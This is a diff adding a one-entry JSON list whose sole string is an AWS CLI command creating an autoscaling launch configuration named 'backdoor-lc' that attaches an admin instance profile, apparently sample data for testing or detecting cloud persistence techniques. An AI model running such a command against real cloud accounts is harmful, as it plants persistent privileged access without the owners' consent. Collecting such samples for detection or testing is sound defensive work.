@@ -1,0 +1,3 @@
+[
+  "aws autoscaling create-launch-configuration --launch-configuration-name backdoor-lc --image-id ami-xxxxx --instance-type t2.micro --iam-instance-profile AdminProfile"
+]
